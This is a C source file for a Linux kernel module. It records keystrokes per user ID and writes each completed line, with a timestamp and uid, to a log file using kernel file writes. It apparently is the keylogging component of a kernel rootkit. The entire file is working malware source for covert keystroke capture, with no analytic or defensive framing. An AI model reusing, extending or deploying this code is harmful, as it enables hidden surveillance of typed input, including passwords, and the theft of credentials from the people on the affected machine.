
#include <linux/types.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/path.h>
#include <linux/stat.h>
#include "fs.h"
#include "tty.h"
#include "log.h"

static DEFINE_SPINLOCK(tty_lock);

struct keylog_t {
	uid_t uid;
	int offset;
	struct list_head list;
	char buf[KEY_LOG_BUF_MAX + 2]; /** newline+'\0' */
};

static void _keylog_cleanup_list(struct list_head *head)
{
	struct keylog_t *node, *node_safe;
	list_for_each_entry_safe (node, node_safe, head, list) {
		list_del(&node->list);
		kfree(node);
	}
}

struct tty_ctx kv_tty_open(struct tty_ctx *ctx, const char *filename)
{
	if (NULL != ctx && NULL != filename)
		ctx->fp = fs_kernel_open_file(filename);

	return *ctx;
}

void kv_tty_write(struct tty_ctx *ctx, uid_t uid, char *buf, ssize_t len)
{
	static loff_t offset;
	struct timespec64 ts;
	long msecs;
	size_t total;

	/**
     * We use a variable-length array (VLA) because the implementation of kernel_write
     * forces a conversion to a user pointer. If the variable is heap-allocated, the
     * pointer may be lost.
     *
     * VLA generates a warning since we're not in C99, but it's necessary for our use case.
     *
     * We allocate +32 bytes, which is enough to hold timestamp + "uid.%d".
     */
	char ttybuf[len + 32];

	spin_lock(&tty_lock);

	ktime_get_boottime_ts64(&ts);
	msecs = ts.tv_nsec / 1000;

	total = snprintf(ttybuf, sizeof(ttybuf), "[%lld.%06ld] uid.%d %s",
			 (long long)ts.tv_sec, msecs, uid, buf);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
	fs_kernel_write_file(ctx->fp, (const void *)ttybuf, total, &offset);
#else
	fs_kernel_write_file(ctx->fp, (const char *)ttybuf, total, offset);
#endif
	spin_unlock(&tty_lock);
}

static int _kv_key_add(struct list_head *head, uid_t uid, char byte, int flags)
{
	struct keylog_t *kl;
	int rv = 0;

	if ((flags & R_RETURN) || (!(flags & R_RANGE)))
		return rv;

	kl = kcalloc(1, sizeof(struct keylog_t), GFP_KERNEL);
	if (!kl) {
		prerr("Insufficient memory\n");
		rv = -ENOMEM;
	} else {
		kl->offset = 0;
		kl->buf[kl->offset++] = byte;
		kl->uid = uid;
		list_add_tail(&kl->list, head);
	}

	return rv;
}

int kv_key_update(struct tty_ctx *ctx, uid_t uid, char byte, int flags)
{
	struct keylog_t *node, *node_safe;
	bool new = true;
	int rv = 0;

	list_for_each_entry_safe (node, node_safe, ctx->head, list) {
		if (node->uid != uid)
			continue;

		if (flags & R_RETURN) {
			node->buf[node->offset++] = '\n';
			node->buf[node->offset] = 0;

			kv_tty_write(ctx, uid, node->buf, strlen(node->buf));

			list_del(&node->list);
			kfree(node);
		} else if ((flags & R_RANGE) || (flags & R_NEWLINE)) {
			if (node->offset < KEY_LOG_BUF_MAX) {
				node->buf[node->offset++] = byte;
			} else {
				prwarn("Warning: max length reached: %d\n",
				       KEY_LOG_BUF_MAX);
				return -ENOMEM;
			}
		}
		new = false;
		break;
	}

	if (new)
		rv = _kv_key_add(ctx->head, uid, byte, flags);

	return rv;
}

void kv_tty_close(struct tty_ctx *ctx)
{
	if (ctx->head) {
		_keylog_cleanup_list(ctx->head);
	} else {
		prerr("kv_tty_close: Error invalid head\n");
	}

	if (ctx->fp) {
		fs_kernel_close_file(ctx->fp);
	} else {
		prerr("kv_tty_close: Error invalid file reference\n");
	}
}
